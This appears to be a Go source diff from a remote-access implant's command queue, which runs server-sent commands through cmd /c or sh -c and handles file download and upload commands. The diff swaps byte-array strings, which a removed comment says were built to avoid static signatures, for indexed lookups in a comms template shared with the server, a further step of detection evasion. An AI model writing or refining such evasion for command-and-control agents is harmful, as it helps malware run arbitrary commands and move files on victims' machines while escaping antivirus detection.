@@ -18,16 +18,21 @@ import (
 	"unicode"
 )
 
-// Command queue strings (constructed to avoid static signatures)
-var (
-	cqWordWindows   = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73})                                           // windows
-	cqShellCmd      = string([]byte{0x63, 0x6d, 0x64})                                                                   // cmd
-	cqShellCmdArg   = string([]byte{0x2f, 0x63})                                                                         // /c
-	cqShellSh       = string([]byte{0x73, 0x68})                                                                         // sh
-	cqShellShArg    = string([]byte{0x2d, 0x63})                                                                         // -c
-	cqCmdDownload   = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64})                                     // download
-	cqCmdUpload     = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})                                                 // upload
+// Command queue template indices - must match server's common.go
+const (
+	idxCqWordWindows = 780 // windows
+	idxCqShellCmd    = 781 // cmd
+	idxCqShellCmdArg = 782 // /c
+	idxCqShellSh     = 783 // sh
+	idxCqShellShArg  = 784 // -c
+	idxCqCmdDownload = 785 // download
+	idxCqCmdUpload   = 786 // upload
 )
+
+// getCqStr gets command queue string from comms template
+func getCqStr(idx int) string {
+	return commsTpl(idx)
+}
 
 // CommandQueue manages the processing of commands
 type CommandQueue struct {
@@ -233,12 +238,12 @@ func (cq *CommandQueue) AddCommands(jsonData string) error {
 func executeShellCommand(command string) (string, error) {
 	var cmd *exec.Cmd
 
-	if runtime.GOOS == cqWordWindows {
+	if runtime.GOOS == getCqStr(idxCqWordWindows) {
 		// On Windows, use cmd.exe
-		cmd = exec.Command(cqShellCmd, cqShellCmdArg, command)
+		cmd = exec.Command(getCqStr(idxCqShellCmd), getCqStr(idxCqShellCmdArg), command)
 	} else {
 		// On Unix-like systems, use sh
-		cmd = exec.Command(cqShellSh, cqShellShArg, command)
+		cmd = exec.Command(getCqStr(idxCqShellSh), getCqStr(idxCqShellShArg), command)
 	}
 
 	output, err := cmd.CombinedOutput()
@@ -354,14 +359,14 @@ func parseDownloadCommand(cmdLine string) []string {
 	cmdLine = strings.TrimSpace(cmdLine)
 
 	// Check if it starts with "download" (case-insensitive)
-	if !strings.HasPrefix(strings.ToLower(cmdLine), cqCmdDownload) {
+	if !strings.HasPrefix(strings.ToLower(cmdLine), getCqStr(idxCqCmdDownload)) {
 		// Not a download command, use regular parsing
 		return parseCommandLine(cmdLine)
 	}
 
 	// Check if there's anything after "download"
 	if len(cmdLine) <= 8 { // len("download") = 8
-		return []string{cqCmdDownload}
+		return []string{getCqStr(idxCqCmdDownload)}
 	}
 
 	// Make sure there's a space after "download"
@@ -374,7 +379,7 @@ func parseDownloadCommand(cmdLine string) []string {
 	remainder := strings.TrimSpace(cmdLine[8:])
 
 	if remainder == "" {
-		return []string{cqCmdDownload}
+		return []string{getCqStr(idxCqCmdDownload)}
 	}
 
 	// For download, treat everything after "download " as the file path
@@ -385,7 +390,7 @@ func parseDownloadCommand(cmdLine string) []string {
 		remainder = remainder[1 : len(remainder)-1]
 	}
 
-	return []string{cqCmdDownload, remainder}
+	return []string{getCqStr(idxCqCmdDownload), remainder}
 }
 
 // parseUploadCommand specifically handles the upload command
@@ -395,14 +400,14 @@ func parseUploadCommand(cmdLine string) []string {
 	cmdLine = strings.TrimSpace(cmdLine)
 
 	// Check if it starts with "upload" (case-insensitive)
-	if !strings.HasPrefix(strings.ToLower(cmdLine), cqCmdUpload) {
+	if !strings.HasPrefix(strings.ToLower(cmdLine), getCqStr(idxCqCmdUpload)) {
 		// Not an upload command, use regular parsing
 		return parseCommandLine(cmdLine)
 	}
 
 	// Check if there's anything after "upload"
 	if len(cmdLine) <= 6 { // len("upload") = 6
-		return []string{cqCmdUpload}
+		return []string{getCqStr(idxCqCmdUpload)}
 	}
 
 	// Make sure there's a space after "upload"
@@ -415,7 +420,7 @@ func parseUploadCommand(cmdLine string) []string {
 	remainder := strings.TrimSpace(cmdLine[6:])
 
 	if remainder == "" {
-		return []string{cqCmdUpload}
+		return []string{getCqStr(idxCqCmdUpload)}
 	}
 
 	// For upload, we need to handle potential spaces in the path
@@ -430,5 +435,5 @@ func parseUploadCommand(cmdLine string) []string {
 	}
 
 	// Return upload command with the full path as a single argument
-	return []string{cqCmdUpload, remainder}
+	return []string{getCqStr(idxCqCmdUpload), remainder}
 }
